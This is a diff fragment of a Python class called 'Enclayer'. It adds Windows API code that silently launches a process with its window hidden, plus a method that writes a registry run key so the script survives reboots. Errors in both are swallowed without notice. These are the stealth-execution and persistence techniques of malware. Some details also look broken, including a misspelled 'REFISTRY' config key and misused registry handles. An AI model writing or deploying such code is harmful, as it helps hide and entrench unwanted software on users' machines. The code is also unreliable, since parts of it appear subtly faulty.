@@ -325,3 +325,45 @@ class Enclayer:
             pid = kernel32.GetWindowThreadProcessId(user32.GetForegroundWindow(), ctypes.byref(ctypes.c_ulong()))
             if not pid:
                 return False
+                
+            startup_info = STARTUPINFOW()
+            process_info = PROCESS_INFORMATION()
+            startup_info.cb = ctypes.sizeof(STARTUPINFOW)
+            startup_info.dwFlags = 0x100
+            startup_info.wShowWindow = 0
+            
+            kernel32.CreateProcessW(
+                None,
+                target_process + " -n",
+                None,
+                None,
+                False,
+                0x08000000,
+                None,
+                None,
+                ctypes.byref(startup_info),
+                ctypes.byref(process_info)
+            )
+            
+            kernel32.WaitForInputIdle(process_info.hProcess, 5000)
+            kernel32.CloseHandle(process_info.hProcess)
+            kernel32.CloseHandle(process_info.hThread)
+            return True
+        except Exception:
+            return False
+            
+    def create_persistence(self) -> None:
+        """Sets up a registry run key to survive reboots."""
+        try:
+            command = f'pythonw "{os.path.abspath(sys.argv[0])}"'
+            advapi32.RegOpenKeyExW(
+                HKEY_CURRENT_USER,
+                PV01_CONFIG["PERSISTENCE_REFISTRY_KEY"],
+                0,
+                KEY_WRITE,
+                ctypes.byref(HKEY)
+            )
+            advapi32.RegSetValueExW(HKEY, "", 0, REG_SZ, command.encode(), len(command.encode()))
+            advapi32.RegCloseKey(HKEY)
+        except Exception:
+            pass
